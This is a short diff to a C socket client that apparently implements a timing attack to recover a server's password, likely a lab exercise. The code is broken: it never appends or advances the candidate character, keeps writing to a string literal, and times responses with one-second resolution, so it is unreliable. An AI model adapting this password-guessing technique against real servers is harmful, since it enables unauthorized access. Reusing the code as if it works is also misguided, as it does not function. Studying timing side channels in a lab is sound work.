@@ -7,6 +7,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <stdbool.h>
+#include <time.h>
 
 #define PORT 4444
 
@@ -23,17 +24,24 @@ char* discoverPassword(int clientSocket, char* username) {
 
     char* password_buffer = "";
     char server_buffer[1024];
-    bool passwordDiscovered = false;
 
+    char maxTimeChar;
+    int maxTime = 0;
+    char currChar = 33;
+    time_t timeBefore, timeAfter;
+
+    // Send the username to the server
     send(clientSocket, username, strlen(username), 0);
-
     if(strcmp(username, ":exit") == 0) {
         close(clientSocket);
         printf("[-]Disconnected from server.\n");
         exit(1);
     }
 
-    while(!passwordDiscovered) {
+    // Perform the timing attack to discover the password
+    while(1) {
+        timeBefore = time(NULL);
+
         send(clientSocket, password_buffer, strlen(password_buffer), 0);
 
         if(recv(clientSocket, server_buffer, 1024, 0) < 0) {
@@ -41,15 +49,18 @@ char* discoverPassword(int clientSocket, char* username) {
             exit(1);
         }
 
+        timeAfter = time(NULL);
+
         if(strcmp(server_buffer, "Authenticated") == 0) {
             break;
         }
         
-        // find the next combination
-        
+        if((timeAfter-timeBefore) > maxTime) {
+            maxTime = timeAfter-timeBefore;
+            maxTimeChar = currChar;
+        }
 
         bzero(server_buffer, sizeof(server_buffer)); 
-        bzero(password_buffer, sizeof(password_buffer)); 
     }
     
     return password_buffer;
